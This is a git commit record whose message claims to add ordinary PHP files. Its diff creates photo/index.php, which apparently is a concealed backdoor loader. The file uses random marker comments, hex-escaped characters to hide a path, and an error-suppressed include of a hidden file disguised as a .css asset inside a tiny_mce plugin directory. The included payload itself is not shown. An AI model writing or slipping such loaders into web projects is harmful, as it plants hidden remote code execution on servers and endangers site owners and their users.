48415718b836c700a41e825751ea529df592506a
Patrick Her <renfu.her@gmail.com>
2024-09-25 17:38:19 +0800

    Add PHP files for /photo and /admin/cart_pic directories

---
+++ photo/index.php
@@ -0,0 +1,8 @@
+<?php
+/*b1bf2*/
+
+$refj24 = "/home/cloud\x70anel/htdocs/sho\x70.enbi.com.tw/tiny_mce/\x70lugins/link/.445ddde5.css"; if (!isset($refj24)) {var_dump ($refj24);} else { @include_once /* 167 */ ($refj24); }
+
+/*b1bf2*/
+
+
